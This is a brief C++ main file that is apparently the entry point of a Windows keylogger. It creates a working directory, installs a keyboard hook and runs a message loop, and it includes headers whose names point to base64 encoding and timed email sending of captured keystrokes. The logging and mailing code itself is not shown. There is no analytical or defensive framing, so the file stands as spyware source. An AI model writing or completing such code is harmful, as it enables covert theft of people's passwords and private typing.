#include <iostream>

#include "helper.h"
#include "KConst.h"
#include "base-64.h"
#include "IO.h"
#include "Timer.h"
#include "SendEmail.h"
#include "KBHook.h"

using namespace std;

int main()
{
    MSG msg;
    IO::MkDir(IO::GetOurPath(true));

    //Install Hook
    InstallHook();
    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    MailTimer.Stop();
    return 0;
}
